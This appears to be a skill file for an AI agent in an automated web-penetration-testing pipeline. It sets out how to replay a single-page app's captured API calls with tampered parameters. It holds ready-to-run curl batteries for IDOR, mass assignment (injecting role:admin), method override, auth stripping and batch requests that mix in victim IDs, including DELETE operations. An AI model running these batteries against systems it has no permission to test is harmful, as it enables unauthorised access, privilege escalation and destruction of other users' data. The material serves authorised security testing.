---
name: spa_api_replay
agent: agent9_interceptor
description: Replay the SPA's own API calls with tampered parameters — IDOR, method override, and mass-assignment on the app's real attack surface.
---

# SPA API Replay

## Purpose

The SPA's own network tab is a perfect API inventory: every endpoint the app genuinely uses, with real parameter shapes, real auth headers, and real workflows. Developers secure the endpoints they *think* attackers will find and forget the ones their own UI calls. This skill takes that captured inventory and systematically replays each call with tampered parameters — the app's real attack surface, tested the way its own client uses it. Real-world impact: IDOR on the exact endpoint the UI calls with your own ID, privilege escalation via a `role` parameter the client sends but the server shouldn't trust, data exfiltration through an unpaginated export endpoint.

## Division of labor

- **Consumes:** `findings/spa_state_crawl_confirmed.md` (per-route API call list: method + path + status) and/or `findings/authenticated_flow_record_confirmed.md` (faithful replay scripts + token lineage); a working authenticated session
- **Produces:** the finished artifact — `findings/spa_api_replay_confirmed.md` containing the endpoint inventory, per-endpoint tamper matrix results, raw pairs for anomalies, and verdicts

## When to use / when NOT to use

- **Use when:** you have a captured API inventory from the SPA (never fuzz blind — replay the app's own calls); testing any authenticated endpoint the UI exercises.
- **Skip when (time-pass filter):** the endpoint is a third-party analytics/tracking call with no app data (log one line, move on); you have no captured inventory and no session (don't invent endpoints — that's another agent's job); the endpoint only serves static public content (nothing to tamper).

## Methodology

1. **Build the endpoint inventory.** From the capture, list every first-party API call: method, full path, query params, body schema, auth headers used, and the UI action that triggers it. Deduplicate by (method, path-template). This list is your coverage contract — every entry gets tested.
2. **Baseline each endpoint.** For each entry, replay it *exactly* as captured (fresh tokens). Record status + response shape. This is the control — every tamper result is judged against it. Also request a known-dead path (`/api/__zz_dead_9f31`) to baseline the API's 404/error shape.
3. **IDOR battery — object references.** For every ID/UUID/slug in path or body: substitute your own other object, `1`, `0`, `-1`, another user's ID (from the app's own UI), another tenant's ID, and a random UUID. Compare responses to the control: data returned for an object you shouldn't access = IDOR, CONFIRMED. Test both read AND write endpoints.
4. **IDOR battery — list endpoints.** For collection endpoints: remove pagination params, set `limit=1000000`, `page=-1`, try `?all=true`, `?admin=true`. A list endpoint that returns other users'/tenants' records without scoping = broken authZ, CONFIRMED.
5. **Parameter pollution.** For query params: send the same param twice (`?id=1&id=2`), array syntax (`?id[]=1&id[]=2`). For bodies: duplicate JSON keys. Servers that parse differently than the client intended can be steered to the attacker's value.
6. **Type juggling.** For each parameter: send string where int expected (`"1"` vs `1`), bool as string, array where scalar expected, object where string expected, empty string, null, and massive ints (`9999999999999999999`). Type confusion frequently bypasses validation and hits different code paths.
7. **Mass assignment.** Add fields the UI never sends: `role`, `isAdmin`, `admin`, `price`, `balance`, `approved`, `tenantId`, `userId`, `createdAt`. If the server honors a client-supplied `role:"admin"` on profile update, that's privilege escalation — CONFIRMED. This is the highest-ROI battery in this skill.
8. **Method override.** Replay each endpoint with the wrong verb: GET→POST, POST→PUT/PATCH/DELETE, and with `X-HTTP-Method-Override` / `_method` params. A DELETE that works via POST+override, or a GET that mutates, reveals verb-level authZ gaps.
9. **Auth stripping.** Replay each endpoint with: no auth header, malformed token, another user's token, and the token in the wrong place (query string instead of header). Endpoints that work unauthenticated = missing auth, CONFIRMED.
10. **Content-type confusion.** Replay JSON endpoints as `application/x-www-form-urlencoded`, `multipart/form-data`, and `text/plain`. Parsers that accept multiple content types often validate only one — the other path is unguarded.
11. **Header tampering.** Vary `X-Forwarded-For`, `X-Real-IP`, `Origin`, `Referer`, `Accept`, `Accept-Language`. Some endpoints branch on headers (admin debug when `X-Forwarded-For: 127.0.0.1`, verbose errors for internal referers).
12. **Response-driven chaining.** For every anomalous response (extra fields, verbose errors, different status), follow it: extra IDs become IDOR battery inputs (step 3), verbose errors become info-leak findings, unexpected 200s become new inventory entries. Chains beat single bugs.
13. **Rate-limit and enumeration probing.** For ID-shaped params, test 20 sequential IDs and measure: does the API distinguish "not found" from "forbidden" (403 vs 404 oracle)? Uniform responses = good; divergent = enumeration oracle. Don't hammer — 20 requests is enough to characterize.
14. **Nested expansion probing.** Many APIs support `?expand=`, `?include=`, `?fields=`, or GraphQL-style nested selection. Try `?expand=user`, `?include=admin,permissions`, `?fields=*`, and nested paths (`?include=user.role`). Over-expansion frequently pulls fields the list view hides — including other users' data and internal flags. Compare expanded vs unexpanded responses field by field.
15. **Batch/bulk endpoint abuse.** If the API has batch endpoints (`/api/batch`, bulk update, multi-delete): send batches mixing your own IDs with victim IDs, batches of 1000 items, and batches with conflicting operations on the same object. Batch handlers routinely skip per-item authZ checks that the single-item endpoints enforce.
16. **Time-box per endpoint, then move on.** 15 minutes per endpoint for the full battery. An endpoint that resists everything is NEGATIVE — log the battery results and move to the next inventory entry.
17. **Write the finished artifact.** Per endpoint: control response, tamper matrix with results, raw pairs for anomalies, verdict.

## Exact commands

Control replay (baseline — exact captured request, fresh tokens):
```bash
curl -s "https://<TARGET>/api/<path>" -H "Authorization: Bearer <TOKEN>" -H "X-CSRF-Token: <CSRF>" -w "\nHTTP:%{http_code}\n" | head -40
# Record status + body shape. This is the control every tamper is judged against.
```

API 404 baseline (the error shape to compare "not found" against):
```bash
curl -s "https://<TARGET>/api/__zz_dead_9f31" -H "Authorization: Bearer <TOKEN>" -w "\nHTTP:%{http_code}\n"
```

IDOR battery (path + body IDs):
```bash
for ID in 1 0 -1 <OWN_OTHER_ID> <VICTIM_ID> <OTHER_TENANT_ID> 00000000-0000-0000-0000-000000000000; do
  echo "=== id=$ID ==="
  curl -s "https://<TARGET>/api/<resource>/$ID" -H "Authorization: Bearer <TOKEN>" -w "\nHTTP:%{http_code}\n" | head -8
done
# Any 200 with another principal's data (vs control) = IDOR. Compare carefully against the 404 baseline.
```

List-endpoint scoping test:
```bash
curl -s "https://<TARGET>/api/<collection>?limit=1000000" -H "Authorization: Bearer <TOKEN>" | python3 -c "import json,sys; d=json.load(sys.stdin); print(type(d), len(d if isinstance(d,list) else d.get('items',[])))"
curl -s "https://<TARGET>/api/<collection>?all=true" -H "Authorization: Bearer <TOKEN>" -w "\nHTTP:%{http_code}\n" | head -5
```

Mass-assignment battery:
```bash
for FIELD in '"role":"admin"' '"isAdmin":true' '"approved":true' '"tenantId":"<OTHER_TENANT>"' '"userId":"<VICTIM_ID>"' '"price":0' '"balance":999999'; do
  echo "=== + $FIELD ==="
  curl -s -X PATCH "https://<TARGET>/api/<resource>/<OWN_ID>" -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"name\":\"probe\",${FIELD}}" -w "\nHTTP:%{http_code}\n" | head -8
done
# Then GET the object and check whether the injected field persisted.
```

Method override:
```bash
curl -s -X POST "https://<TARGET>/api/<resource>/<ID>" -H "Authorization: Bearer <TOKEN>" -H "X-HTTP-Method-Override: DELETE" -w "\nHTTP:%{http_code}\n"
curl -s "https://<TARGET>/api/<resource>/<ID>?_method=DELETE" -H "Authorization: Bearer <TOKEN>" -w "\nHTTP:%{http_code}\n"
```

Auth stripping matrix:
```bash
P="https://<TARGET>/api/<path>"
curl -s "$P" -w "\nNOAUTH:%{http_code}\n" -o /dev/null
curl -s "$P" -H "Authorization: Bearer invalid" -w "\nBADTOKEN:%{http_code}\n" -o /dev/null
curl -s "$P?access_token=<TOKEN>" -w "\nQUERYTOKEN:%{http_code}\n" -o /dev/null
```

Type juggling:
```bash
for V in '"1"' '1' 'true' '"true"' '[]' '{}' '""' 'null' '9999999999999999999' '-1'; do
  echo "=== $V ==="
  curl -s "https://<TARGET>/api/<resource>?<param>=$V" -H "Authorization: Bearer <TOKEN>" -w "\nHTTP:%{http_code}\n" | head -4
done
```

Nested expansion probe:
```bash
for X in 'expand=user' 'include=user,role' 'fields=*' 'expand=*' 'include=user.role.permissions' 'populate=*'; do
  echo "=== ?$X ==="
  curl -s "https://<TARGET>/api/<resource>/<OWN_ID>?$X" -H "Authorization: Bearer <TOKEN>" | python3 -c "import json,sys; d=json.load(sys.stdin); print(sorted(d.keys() if isinstance(d,dict) else []))" 2>/dev/null || echo "(non-JSON)"
done
# New keys vs the unexpanded control = over-expansion. Check each new field for other users' data.
```

Batch endpoint abuse:
```bash
curl -s -X POST "https://<TARGET>/api/batch" -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d '{
  "ops": [
    {"method":"GET","path":"/api/users/<OWN_ID>"},
    {"method":"GET","path":"/api/users/<VICTIM_ID>"},
    {"method":"DELETE","path":"/api/items/<OWN_ID>"},
    {"method":"DELETE","path":"/api/items/<VICTIM_ID>"}
  ]}' -w "\nHTTP:%{http_code}\n" | head -30
# Per-item results that bypass the single-item authZ = batch authZ gap (CONFIRMED).
```

## Completion-bias defenses

- [ ] Step 1: endpoint inventory built from capture (method + path-template + params + trigger); count recorded
- [ ] Step 2: control replay + API 404 baseline recorded per endpoint
- [ ] Step 3: IDOR battery run on every ID-bearing endpoint (6+ substitutions each)
- [ ] Step 4: list endpoints tested for scoping (pagination removal, huge limits)
- [ ] Step 5: parameter pollution tested on query + body params
- [ ] Step 6: type juggling battery run per parameter
- [ ] Step 7: mass-assignment battery run (all six field classes minimum)
- [ ] Step 8: method override tested per endpoint
- [ ] Step 9: auth-stripping matrix run per endpoint
- [ ] Step 10: content-type confusion tested per JSON endpoint
- [ ] Step 11: header tampering battery run
- [ ] Step 12: every anomalous response chained (new IDs → step 3, errors → leak notes)
- [ ] Step 13: 403-vs-404 oracle characterized (20 sequential IDs max)
- [ ] Step 14: nested expansion battery run (?expand/?include/?fields), new fields checked for cross-user data
- [ ] Step 15: batch/bulk endpoints tested (mixed-ownership batches, 1000-item batches)
- [ ] Step 16: time-box respected (15 min/endpoint); resisted endpoints logged NEGATIVE
- [ ] Step 17: finished artifact written to disk
- **Review step:** agent10_review must verify: (a) the inventory count matches the capture (no endpoint skipped), (b) every CONFIRMED IDOR/mass-assignment claim has control-vs-tamper response pairs, (c) no "tested" endpoint lacks a control replay.
- **Nudge prompts:** "Keep going until every endpoint in your inventory has a full tamper matrix, not just the ones that looked interesting." / "Do not report done before findings/spa_api_replay_confirmed.md exists on disk with a verdict per endpoint." / "If you tested only the happy-path IDs, you tested nothing — the 0, -1, cross-tenant, and victim IDs are the battery."
- **Finished artifact definition:** `findings/spa_api_replay_confirmed.md` — endpoint inventory, per-endpoint tamper matrix (battery × result), control-vs-tamper raw pairs for anomalies, chained leads, verdict per endpoint.

## Evidence standard

- Baseline: the exact-capture control replay + the API 404 error shape — every anomaly judged against both
- Reproduction: 2x independent reproduction required — re-run the tamper with fresh tokens and fresh object IDs; server-side authZ bugs must reproduce
- Raw evidence: full request/response pairs for control AND tamper, side by side, headers included
- Verdicts: CONFIRMED (tamper reproducibly crosses an authZ boundary vs control) / INCONCLUSIVE (flaky or needs a second model run / human) / NEGATIVE (full battery resisted — documented so nobody re-tests it)

## Handoffs

- `authenticated_flow_record` supplies the faithful replays and token lineage this skill's batteries are built on.
- `spa_state_crawl` supplies the per-route API inventory (the coverage contract).
- `file_upload_pipeline` receives any upload endpoints found in the inventory for its upload→serve chain testing.
- `client_side_access_control` receives endpoints that returned data despite UI gating.
- agent10_review consumes `findings/spa_api_replay_confirmed.md` and spot-checks one control replay before anything ships.
